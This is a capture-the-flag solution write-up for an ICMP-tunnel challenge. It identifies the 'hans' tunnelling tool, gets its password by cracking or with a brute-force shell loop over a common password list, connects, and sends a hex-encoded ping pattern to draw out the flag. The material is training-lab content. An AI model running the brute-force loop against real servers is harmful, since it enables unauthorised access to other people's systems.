# Solution

1. Realize the server is using `hans` software for tunneling over ICMP. One can easily found that by googling "hans icmp".

2. How to find a password:

Option 1. Based on [hans source code](https://github.com/friedrich/hans/blob/master/src/auth.cpp#L30), crack the password. See the last lines of [solution.py](solution.py)

Option 2. Brute-force:

```
for PASSWORD in $(<xato-net-10-million-passwords-100.txt); do echo "### $PASSWORD" ; sudo ../src/bin/hans -p "$PASSWORD" -c "$SERVER_IP" -f -v ; done
```

3. Connect with found password

```
./hans -p "$PASSWORD" -c "$SERVER_IP" -f -v
```


4. Do the same thing as in PCAP capture (send special pattern)

```
>>> s='pleasegivemeflag'
>>> print(''.join([hex(ord(c)).replace('0x','') for c in s]))
706c65617365676976656d65666c6167

ping 192.168.18.1 -p 706c65617365676976656d65666c6167
```

5. Observe the flag in an ICMP response payload.
